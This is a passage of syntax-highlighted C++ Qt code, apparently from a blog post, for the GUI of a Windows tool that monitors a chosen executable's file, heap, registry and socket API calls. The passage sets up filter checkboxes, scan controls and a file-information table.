class="built_in">QCheckBox</span>();</span><br><span class="line">	File_create-&gt;<span class="built_in">setChecked</span>(<span class="literal">true</span>);</span><br><span class="line">	File_write-&gt;<span class="built_in">setChecked</span>(<span class="literal">true</span>);</span><br><span class="line">	File_read-&gt;<span class="built_in">setChecked</span>(<span class="literal">true</span>);</span><br><span class="line">	File_close-&gt;<span class="built_in">setChecked</span>(<span class="literal">true</span>);</span><br><span class="line">	File_copy-&gt;<span class="built_in">setChecked</span>(<span class="literal">true</span>);</span><br><span class="line">	File_create-&gt;<span class="built_in">setText</span>(<span class="string">&quot;CreateFile&quot;</span>);</span><br><span class="line">	File_write-&gt;<span class="built_in">setText</span>(<span class="string">&quot;WriteFile&quot;</span>);</span><br><span class="line">	File_read-&gt;<span class="built_in">setText</span>(<span class="string">&quot;ReadFile&quot;</span>);</span><br><span class="line">	File_close-&gt;<span class="built_in">setText</span>(<span class="string">&quot;CloseHandle&quot;</span>);</span><br><span class="line">	File_copy-&gt;<span class="built_in">setText</span>(<span class="string">&quot;CopyFileA&quot;</span>);</span><br><span class="line">	<span class="comment">//添加checkbox</span></span><br><span class="line">	FileList-&gt;<span class="built_in">addItem</span>(item3);</span><br><span class="line">	FileList-&gt;<span class="built_in">addItem</span>(item4);</span><br><span class="line">	FileList-&gt;<span class="built_in">addItem</span>(item5);</span><br><span class="line">	FileList-&gt;<span class="built_in">addItem</span>(item6);</span><br><span class="line">	FileList-&gt;<span class="built_in">addItem</span>(item21);</span><br><span class="line">	FileList-&gt;<span class="built_in">setItemWidget</span>(item3, File_create);</span><br><span class="line">	FileList-&gt;<span class="built_in">setItemWidget</span>(item4, File_write);</span><br><span class="line">	FileList-&gt;<span class="built_in">setItemWidget</span>(item5, File_read);</span><br><span class="line">	FileList-&gt;<span class="built_in">setItemWidget</span>(item6, File_close);</span><br><span class="line">	FileList-&gt;<span class="built_in">setItemWidget</span>(item21, File_copy);</span><br><span class="line">	<span class="comment">//信号绑定</span></span><br><span class="line">	<span class="built_in">connect</span>(File_create, <span class="built_in">SIGNAL</span>(<span class="built_in">stateChanged</span>(<span class="keyword">int</span>)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">State_CreateFile</span>(<span class="keyword">int</span>)));</span><br><span class="line">	<span class="built_in">connect</span>(File_write, <span class="built_in">SIGNAL</span>(<span class="built_in">stateChanged</span>(<span class="keyword">int</span>)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">State_WriteFile</span>(<span class="keyword">int</span>)));</span><br><span class="line">	<span class="built_in">connect</span>(File_read, <span class="built_in">SIGNAL</span>(<span class="built_in">stateChanged</span>(<span class="keyword">int</span>)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">State_ReadFile</span>(<span class="keyword">int</span>)));</span><br><span class="line">	<span class="built_in">connect</span>(File_close, <span class="built_in">SIGNAL</span>(<span class="built_in">stateChanged</span>(<span class="keyword">int</span>)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">State_CloseHandle</span>(<span class="keyword">int</span>)));</span><br><span class="line">	<span class="built_in">connect</span>(File_copy, <span class="built_in">SIGNAL</span>(<span class="built_in">stateChanged</span>(<span class="keyword">int</span>)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">State_copyfilea</span>(<span class="keyword">int</span>)));</span><br><span class="line">	ui.FileCheckBox-&gt;<span class="built_in">setModel</span>(FileList-&gt;<span class="built_in">model</span>());</span><br><span class="line">	ui.FileCheckBox-&gt;<span class="built_in">setView</span>(FileList);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//对于堆操作API过滤</span></span><br><span class="line">	HeapList = <span class="keyword">new</span> <span class="built_in">QListWidget</span>();</span><br><span class="line">	HeapList-&gt;<span class="built_in">setObjectName</span>(<span class="built_in">QString</span>(<span class="string">&quot;listwidget_heap&quot;</span>));</span><br><span class="line">	<span class="comment">//四个checkbox</span></span><br><span class="line">	QListWidgetItem* item7 = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	QListWidgetItem* item8 = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	QListWidgetItem* item9 = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	QListWidgetItem* item10 = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	QCheckBox* Heap_create = <span class="keyword">new</span> <span class="built_in">QCheckBox</span>();</span><br><span class="line">	QCheckBox* Heap_destroy = <span class="keyword">new</span> <span class="built_in">QCheckBox</span>();</span><br><span class="line">	QCheckBox* Heap_free = <span class="keyword">new</span> <span class="built_in">QCheckBox</span>();</span><br><span class="line">	QCheckBox* Heap_alloc = <span class="keyword">new</span> <span class="built_in">QCheckBox</span>();</span><br><span class="line">	Heap_create-&gt;<span class="built_in">setChecked</span>(<span class="literal">true</span>);</span><br><span class="line">	Heap_destroy-&gt;<span class="built_in">setChecked</span>(<span class="literal">true</span>);</span><br><span class="line">	Heap_free-&gt;<span class="built_in">setChecked</span>(<span class="literal">true</span>);</span><br><span class="line">	Heap_alloc-&gt;<span class="built_in">setChecked</span>(<span class="literal">true</span>);</span><br><span class="line">	Heap_create-&gt;<span class="built_in">setText</span>(<span class="string">&quot;HeapCreate&quot;</span>);</span><br><span class="line">	Heap_destroy-&gt;<span class="built_in">setText</span>(<span class="string">&quot;HeapDestroy&quot;</span>);</span><br><span class="line">	Heap_free-&gt;<span class="built_in">setText</span>(<span class="string">&quot;HeapFree&quot;</span>);</span><br><span class="line">	Heap_alloc-&gt;<span class="built_in">setText</span>(<span class="string">&quot;HeapAlloc&quot;</span>);</span><br><span class="line">	<span class="comment">//添加checkbox</span></span><br><span class="line">	HeapList-&gt;<span class="built_in">addItem</span>(item7);</span><br><span class="line">	HeapList-&gt;<span class="built_in">addItem</span>(item8);</span><br><span class="line">	HeapList-&gt;<span class="built_in">addItem</span>(item9);</span><br><span class="line">	HeapList-&gt;<span class="built_in">addItem</span>(item10);</span><br><span class="line">	HeapList-&gt;<span class="built_in">setItemWidget</span>(item7, Heap_create);</span><br><span class="line">	HeapList-&gt;<span class="built_in">setItemWidget</span>(item8, Heap_destroy);</span><br><span class="line">	HeapList-&gt;<span class="built_in">setItemWidget</span>(item9, Heap_free);</span><br><span class="line">	HeapList-&gt;<span class="built_in">setItemWidget</span>(item10, Heap_alloc);</span><br><span class="line">	<span class="comment">//信号绑定</span></span><br><span class="line">	<span class="built_in">connect</span>(Heap_create, <span class="built_in">SIGNAL</span>(<span class="built_in">stateChanged</span>(<span class="keyword">int</span>)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">State_HeapCreate</span>(<span class="keyword">int</span>)));</span><br><span class="line">	<span class="built_in">connect</span>(Heap_destroy, <span class="built_in">SIGNAL</span>(<span class="built_in">stateChanged</span>(<span class="keyword">int</span>)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">State_HeapDestroy</span>(<span class="keyword">int</span>)));</span><br><span class="line">	<span class="built_in">connect</span>(Heap_free, <span class="built_in">SIGNAL</span>(<span class="built_in">stateChanged</span>(<span class="keyword">int</span>)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">State_HeapFree</span>(<span class="keyword">int</span>)));</span><br><span class="line">	<span class="built_in">connect</span>(Heap_alloc, <span class="built_in">SIGNAL</span>(<span class="built_in">stateChanged</span>(<span class="keyword">int</span>)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">State_HeapAlloc</span>(<span class="keyword">int</span>)));</span><br><span class="line">	ui.HeapCheckBox-&gt;<span class="built_in">setModel</span>(HeapList-&gt;<span class="built_in">model</span>());</span><br><span class="line">	ui.HeapCheckBox-&gt;<span class="built_in">setView</span>(HeapList);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//对于注册表API过滤</span></span><br><span class="line">	RegList = <span class="keyword">new</span> <span class="built_in">QListWidget</span>();</span><br><span class="line">	RegList-&gt;<span class="built_in">setObjectName</span>(<span class="built_in">QString</span>(<span class="string">&quot;listwidget_reg&quot;</span>));</span><br><span class="line">	<span class="comment">//5个checkbox</span></span><br><span class="line">	QListWidgetItem* item11 = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	QListWidgetItem* item12 = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	QListWidgetItem* item13 = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	QListWidgetItem* item14 = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	QListWidgetItem* item15 = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	QCheckBox* Reg_create = <span class="keyword">new</span> <span class="built_in">QCheckBox</span>();</span><br><span class="line">	QCheckBox* Reg_setvalue = <span class="keyword">new</span> <span class="built_in">QCheckBox</span>();</span><br><span class="line">	QCheckBox* Reg_close = <span class="keyword">new</span> <span class="built_in">QCheckBox</span>();</span><br><span class="line">	QCheckBox* Reg_open = <span class="keyword">new</span> <span class="built_in">QCheckBox</span>();</span><br><span class="line">	QCheckBox* Reg_delete = <span class="keyword">new</span> <span class="built_in">QCheckBox</span>();</span><br><span class="line">	<span class="comment">//设置默认选中</span></span><br><span class="line">	Reg_create-&gt;<span class="built_in">setChecked</span>(<span class="literal">true</span>);</span><br><span class="line">	Reg_setvalue-&gt;<span class="built_in">setChecked</span>(<span class="literal">true</span>);</span><br><span class="line">	Reg_close-&gt;<span class="built_in">setChecked</span>(<span class="literal">true</span>);</span><br><span class="line">	Reg_open-&gt;<span class="built_in">setChecked</span>(<span class="literal">true</span>);</span><br><span class="line">	Reg_delete-&gt;<span class="built_in">setChecked</span>(<span class="literal">true</span>);</span><br><span class="line">	<span class="comment">//设置文本内容</span></span><br><span class="line">	Reg_create-&gt;<span class="built_in">setText</span>(<span class="string">&quot;RegCreateKeyEx&quot;</span>);</span><br><span class="line">	Reg_setvalue-&gt;<span class="built_in">setText</span>(<span class="string">&quot;RegSetValueEx&quot;</span>);</span><br><span class="line">	Reg_close-&gt;<span class="built_in">setText</span>(<span class="string">&quot;RegCloseKey&quot;</span>);</span><br><span class="line">	Reg_open-&gt;<span class="built_in">setText</span>(<span class="string">&quot;RegOpenKeyEx&quot;</span>);</span><br><span class="line">	Reg_delete-&gt;<span class="built_in">setText</span>(<span class="string">&quot;RegDeleteValue&quot;</span>);</span><br><span class="line">	<span class="comment">//添加item</span></span><br><span class="line">	RegList-&gt;<span class="built_in">addItem</span>(item11);</span><br><span class="line">	RegList-&gt;<span class="built_in">addItem</span>(item12);</span><br><span class="line">	RegList-&gt;<span class="built_in">addItem</span>(item13);</span><br><span class="line">	RegList-&gt;<span class="built_in">addItem</span>(item14);</span><br><span class="line">	RegList-&gt;<span class="built_in">addItem</span>(item15);</span><br><span class="line">	<span class="comment">//设置checkbox</span></span><br><span class="line">	RegList-&gt;<span class="built_in">setItemWidget</span>(item11, Reg_create);</span><br><span class="line">	RegList-&gt;<span class="built_in">setItemWidget</span>(item12, Reg_setvalue);</span><br><span class="line">	RegList-&gt;<span class="built_in">setItemWidget</span>(item13, Reg_close);</span><br><span class="line">	RegList-&gt;<span class="built_in">setItemWidget</span>(item14, Reg_open);</span><br><span class="line">	RegList-&gt;<span class="built_in">setItemWidget</span>(item15, Reg_delete);</span><br><span class="line">	<span class="comment">//绑定信号</span></span><br><span class="line">	<span class="built_in">connect</span>(Reg_create, <span class="built_in">SIGNAL</span>(<span class="built_in">stateChanged</span>(<span class="keyword">int</span>)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">State_RegCreateKeyEx</span>(<span class="keyword">int</span>)));</span><br><span class="line">	<span class="built_in">connect</span>(Reg_setvalue, <span class="built_in">SIGNAL</span>(<span class="built_in">stateChanged</span>(<span class="keyword">int</span>)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">State_RegSetValueEx</span>(<span class="keyword">int</span>)));</span><br><span class="line">	<span class="built_in">connect</span>(Reg_close, <span class="built_in">SIGNAL</span>(<span class="built_in">stateChanged</span>(<span class="keyword">int</span>)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">State_RegCloseKey</span>(<span class="keyword">int</span>)));</span><br><span class="line">	<span class="built_in">connect</span>(Reg_open, <span class="built_in">SIGNAL</span>(<span class="built_in">stateChanged</span>(<span class="keyword">int</span>)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">State_RegOpenKeyEx</span>(<span class="keyword">int</span>)));</span><br><span class="line">	<span class="built_in">connect</span>(Reg_delete, <span class="built_in">SIGNAL</span>(<span class="built_in">stateChanged</span>(<span class="keyword">int</span>)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">State_RegDeleteValue</span>(<span class="keyword">int</span>)));</span><br><span class="line">	<span class="comment">//修改视图</span></span><br><span class="line">	ui.RegCheckBox-&gt;<span class="built_in">setModel</span>(RegList-&gt;<span class="built_in">model</span>());</span><br><span class="line">	ui.RegCheckBox-&gt;<span class="built_in">setView</span>(RegList);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//对于网络通信</span></span><br><span class="line">	SocketList = <span class="keyword">new</span> <span class="built_in">QListWidget</span>();</span><br><span class="line">	SocketList-&gt;<span class="built_in">setObjectName</span>(<span class="built_in">QString</span>(<span class="string">&quot;listwidget_socket&quot;</span>));</span><br><span class="line">	<span class="comment">//5个checkbox</span></span><br><span class="line">	QListWidgetItem* item16 = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	QListWidgetItem* item17 = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	QListWidgetItem* item18 = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	QListWidgetItem* item19 = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	QListWidgetItem* item20 = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	QCheckBox* Socket_socket = <span class="keyword">new</span> <span class="built_in">QCheckBox</span>();</span><br><span class="line">	QCheckBox* Socket_bind = <span class="keyword">new</span> <span class="built_in">QCheckBox</span>();</span><br><span class="line">	QCheckBox* Socket_connect = <span class="keyword">new</span> <span class="built_in">QCheckBox</span>();</span><br><span class="line">	QCheckBox* Socket_send = <span class="keyword">new</span> <span class="built_in">QCheckBox</span>();</span><br><span class="line">	QCheckBox* Socket_recv = <span class="keyword">new</span> <span class="built_in">QCheckBox</span>();</span><br><span class="line">	<span class="comment">//设置默认选中</span></span><br><span class="line">	Socket_socket-&gt;<span class="built_in">setChecked</span>(<span class="literal">true</span>);</span><br><span class="line">	Socket_bind-&gt;<span class="built_in">setChecked</span>(<span class="literal">true</span>);</span><br><span class="line">	Socket_connect-&gt;<span class="built_in">setChecked</span>(<span class="literal">true</span>);</span><br><span class="line">	Socket_send-&gt;<span class="built_in">setChecked</span>(<span class="literal">true</span>);</span><br><span class="line">	Socket_recv-&gt;<span class="built_in">setChecked</span>(<span class="literal">true</span>);</span><br><span class="line">	<span class="comment">//设置文本内容</span></span><br><span class="line">	Socket_socket-&gt;<span class="built_in">setText</span>(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line">	Socket_bind-&gt;<span class="built_in">setText</span>(<span class="string">&quot;bind&quot;</span>);</span><br><span class="line">	Socket_connect-&gt;<span class="built_in">setText</span>(<span class="string">&quot;connect&quot;</span>);</span><br><span class="line">	Socket_send-&gt;<span class="built_in">setText</span>(<span class="string">&quot;send&quot;</span>);</span><br><span class="line">	Socket_recv-&gt;<span class="built_in">setText</span>(<span class="string">&quot;recv&quot;</span>);</span><br><span class="line">	<span class="comment">//添加item</span></span><br><span class="line">	SocketList-&gt;<span class="built_in">addItem</span>(item16);</span><br><span class="line">	SocketList-&gt;<span class="built_in">addItem</span>(item17);</span><br><span class="line">	SocketList-&gt;<span class="built_in">addItem</span>(item18);</span><br><span class="line">	SocketList-&gt;<span class="built_in">addItem</span>(item19);</span><br><span class="line">	SocketList-&gt;<span class="built_in">addItem</span>(item20);</span><br><span class="line">	<span class="comment">//设置checkbox</span></span><br><span class="line">	SocketList-&gt;<span class="built_in">setItemWidget</span>(item16,Socket_socket);</span><br><span class="line">	SocketList-&gt;<span class="built_in">setItemWidget</span>(item17,Socket_bind);</span><br><span class="line">	SocketList-&gt;<span class="built_in">setItemWidget</span>(item18,Socket_connect);</span><br><span class="line">	SocketList-&gt;<span class="built_in">setItemWidget</span>(item19,Socket_send);</span><br><span class="line">	SocketList-&gt;<span class="built_in">setItemWidget</span>(item20,Socket_recv);</span><br><span class="line">	<span class="comment">//绑定信号</span></span><br><span class="line">	<span class="built_in">connect</span>(Socket_socket, <span class="built_in">SIGNAL</span>(<span class="built_in">stateChanged</span>(<span class="keyword">int</span>)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">State_socket</span>(<span class="keyword">int</span>)));</span><br><span class="line">	<span class="built_in">connect</span>(Socket_bind, <span class="built_in">SIGNAL</span>(<span class="built_in">stateChanged</span>(<span class="keyword">int</span>)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">State_bind</span>(<span class="keyword">int</span>)));</span><br><span class="line">	<span class="built_in">connect</span>(Socket_connect, <span class="built_in">SIGNAL</span>(<span class="built_in">stateChanged</span>(<span class="keyword">int</span>)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">State_connect</span>(<span class="keyword">int</span>)));</span><br><span class="line">	<span class="built_in">connect</span>(Socket_send, <span class="built_in">SIGNAL</span>(<span class="built_in">stateChanged</span>(<span class="keyword">int</span>)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">State_send</span>(<span class="keyword">int</span>)));</span><br><span class="line">	<span class="built_in">connect</span>(Socket_recv, <span class="built_in">SIGNAL</span>(<span class="built_in">stateChanged</span>(<span class="keyword">int</span>)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">State_recv</span>(<span class="keyword">int</span>)));</span><br><span class="line">	<span class="comment">//修改视图</span></span><br><span class="line">	ui.SocketCheckBox-&gt;<span class="built_in">setModel</span>(SocketList-&gt;<span class="built_in">model</span>());</span><br><span class="line">	ui.SocketCheckBox-&gt;<span class="built_in">setView</span>(SocketList);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::on_threadA_newStatus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (threadA.<span class="built_in">GetStatus</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//进程在运行</span></span><br><span class="line">		ui.ProcessStatus-&gt;<span class="built_in">setIconSize</span>(<span class="built_in">QSize</span>(<span class="number">32</span>, <span class="number">32</span>));</span><br><span class="line">		ui.ProcessStatus-&gt;<span class="built_in">setIcon</span>(<span class="built_in">QIcon</span>(<span class="string">&quot;./Resources/running.png&quot;</span>));</span><br><span class="line">		ui.ProcessStatus-&gt;<span class="built_in">setText</span>(QString::<span class="built_in">fromLocal8Bit</span>(<span class="string">&quot;进程正在运行！&quot;</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">//进程停止运行</span></span><br><span class="line">		ui.ProcessStatus-&gt;<span class="built_in">setIconSize</span>(<span class="built_in">QSize</span>(<span class="number">32</span>, <span class="number">32</span>));</span><br><span class="line">		ui.ProcessStatus-&gt;<span class="built_in">setIcon</span>(<span class="built_in">QIcon</span>(<span class="string">&quot;./Resources/notrun.png&quot;</span>));</span><br><span class="line">		ui.ProcessStatus-&gt;<span class="built_in">setText</span>(QString::<span class="built_in">fromLocal8Bit</span>(<span class="string">&quot;进程停止运行！&quot;</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::on_FileOpen_clicked</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	QFileDialog* f = <span class="keyword">new</span> <span class="built_in">QFileDialog</span>(<span class="keyword">this</span>);</span><br><span class="line">	f-&gt;<span class="built_in">setWindowTitle</span>(<span class="string">&quot;Select EXE File&quot;</span>);</span><br><span class="line">	f-&gt;<span class="built_in">setNameFilter</span>(<span class="string">&quot;*.exe&quot;</span>);</span><br><span class="line">	f-&gt;<span class="built_in">setViewMode</span>(QFileDialog::Detail);</span><br><span class="line"></span><br><span class="line">	QString filePath;</span><br><span class="line">	<span class="keyword">if</span> (f-&gt;<span class="built_in">exec</span>() == QDialog::Accepted)</span><br><span class="line">		filePath = f-&gt;<span class="built_in">selectedFiles</span>()[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">if</span> (filePath.<span class="built_in">isEmpty</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		QMessageBox mesg;</span><br><span class="line">		mesg.<span class="built_in">warning</span>(<span class="keyword">this</span>, <span class="string">&quot;warning&quot;</span>, <span class="string">&quot;open file failed!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		ui.FilePathShow-&gt;<span class="built_in">setText</span>(filePath);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">FileInfoShow</span>(filePath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::on_StartScan_clicked</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	QByteArray temp = ui.FilePathShow-&gt;<span class="built_in">toPlainText</span>().<span class="built_in">toLatin1</span>();</span><br><span class="line">	threadA.<span class="built_in">init</span>(temp.<span class="built_in">data</span>());</span><br><span class="line">	threadA.<span class="built_in">ModifyProcessStatus</span>(<span class="literal">true</span>);</span><br><span class="line">	threadA.<span class="built_in">start</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::on_CleanInfo_clicked</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ui.MessageBoxInfo-&gt;<span class="built_in">clear</span>();</span><br><span class="line">	ui.FileApiInfo-&gt;<span class="built_in">clear</span>();</span><br><span class="line">	ui.HeapApiInfo-&gt;<span class="built_in">clear</span>();</span><br><span class="line">	ui.RegApiInfo-&gt;<span class="built_in">clear</span>();</span><br><span class="line">	ui.SocketApiInfo-&gt;<span class="built_in">clear</span>();</span><br><span class="line">	HeapException-&gt;<span class="built_in">clear</span>();</span><br><span class="line">	RegException-&gt;<span class="built_in">clear</span>();</span><br><span class="line">	FileException-&gt;<span class="built_in">clear</span>();</span><br><span class="line">	SocketException-&gt;<span class="built_in">clear</span>();</span><br><span class="line">	ui.HeapCreateAndDestroy-&gt;<span class="built_in">clear</span>();</span><br><span class="line">	ui.HeapMemoryBlock-&gt;<span class="built_in">clear</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::closeEvent</span><span class="params">(QCloseEvent* event)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (threadA.<span class="built_in">isRunning</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		threadA.<span class="built_in">StopThread</span>();</span><br><span class="line">		threadA.<span class="built_in">wait</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	event-&gt;<span class="built_in">accept</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::on_StopThread_clicked</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	threadA.<span class="built_in">StopThread</span>();</span><br><span class="line">	ui.ProcessInfoTable-&gt;<span class="built_in">item</span>(<span class="number">2</span>, <span class="number">1</span>)-&gt;<span class="built_in">setText</span>(<span class="string">&quot;NULL&quot;</span>);</span><br><span class="line">	ui.ProcessInfoTable-&gt;<span class="built_in">item</span>(<span class="number">3</span>, <span class="number">1</span>)-&gt;<span class="built_in">setText</span>(<span class="string">&quot;NULL&quot;</span>);</span><br><span class="line">	ui.ProcessInfoTable-&gt;<span class="built_in">item</span>(<span class="number">4</span>, <span class="number">1</span>)-&gt;<span class="built_in">setText</span>(<span class="string">&quot;NULL&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::FileInfoWindow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">horizontalHeader</span>()-&gt;<span class="built_in">hide</span>();</span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">verticalHeader</span>()-&gt;<span class="built_in">hide</span>();</span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">setColumnCount</span>(<span class="number">2</span>);</span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">setColumnWidth</span>(<span class="number">0</span>, <span class="number">200</span>);</span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">setColumnWidth</span>(<span class="number">1</span>, <span class="number">400</span>);</span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">setRowCount</span>(<span class="number">6</span>);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//ui.FileInfo-&gt;item(0, 0)-&gt;setText(&quot;File  Info  Table&quot;);</span></span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">setItem</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="keyword">new</span> <span class="built_in">QTableWidgetItem</span>(<span class="string">&quot;File  Info  Table&quot;</span>));</span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">item</span>(<span class="number">0</span>, <span class="number">0</span>)-&gt;<span class="built_in">setTextAlignment</span>(Qt::AlignCenter | Qt::AlignHCenter);</span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">item</span>(<span class="number">0</span>,<span class="number">0</span>)-&gt;<span class="built_in">setFont</span>(<span class="built_in">QFont</span>(<span class="string">&quot;song&quot;</span>, <span class="number">12</span>));</span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">item</span>(<span class="number">0</span>,<span class="number">0</span>)-&gt;<span class="built_in">setBackgroundColor</span>(Qt::gray);</span><br><span class="line"></span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">setItem</span>(<span class="number">1</span>, <span class="number">0</span>, <span class="keyword">new</span> <span class="built_in">QTableWidgetItem</span>(<span class="string">&quot;Key&quot;</span>));</span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">item</span>(<span class="number">1</span>, <span class="number">0</span>)-&gt;<span class="built_in">setTextAlignment</span>(Qt::AlignCenter | Qt::AlignHCenter);</span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">setItem</span>(<span class="number">1</span>, <span class="number">1</span>, <span class="keyword">new</span> <span class="built_in">QTableWidgetItem</span>(<span class="string">&quot;Value&quot;</span>));</span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">item</span>(<span class="number">1</span>, <span class="number">1</span>)-&gt;<span class="built_in">setTextAlignment</span>(Qt::AlignCenter | Qt::AlignHCenter);</span><br><span class="line"></span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">setEditTriggers</span>(QAbstractItemView::NoEditTriggers);</span><br><span class="line"></span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">setSpan</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::FileInfoShow</span><span class="params">(QString filepath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">QFileInfo <span class="title">info</span><span class="params">(filepath)</span></span>;</span><br><span class="line">	<span class="comment">//QTableWidget* FileInfo = new QTableWidget(5, 2);</span></span><br><span class="line">	<span class="comment">//FileInfo-&gt;resize(300, 300);</span></span><br><span class="line">	<span class="comment">//FileInfo-&gt;show();</span></span><br><span class="line">	<span class="keyword">int</span> column = ui.FileInfo-&gt;<span class="built_in">columnCount</span>();</span><br><span class="line">	<span class="keyword">int</span> row = ui.FileInfo-&gt;<span class="built_in">rowCount</span>();</span><br><span class="line"></span><br><span class="line">	QString filename = info.<span class="built_in">fileName</span>();</span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">setItem</span>(<span class="number">2</span>, <span class="number">0</span>, <span class="keyword">new</span> <span class="built_in">QTableWidgetItem</span>(<span class="string">&quot;File  Name&quot;</span>));</span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">setItem</span>(<span class="number">2</span>, <span class="number">1</span>, <span class="keyword">new</span> <span class="built_in">QTableWidgetItem</span>(filename));</span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">setItem</span>(<span class="number">3</span>, <span class="number">0</span>, <span class="keyword">new</span> <span class="built_in">QTableWidgetItem</span>(<span class="string">&quot;File  Size&quot;</span>));</span><br><span class="line">	ui.FileInfo-&gt;<span class="built_in">setItem</span>(<span class="number">3</span>, <span class="number">1</span>, <span class="keyword">new</span> <span class="built_in">QTableWidgetItem</span>(<span 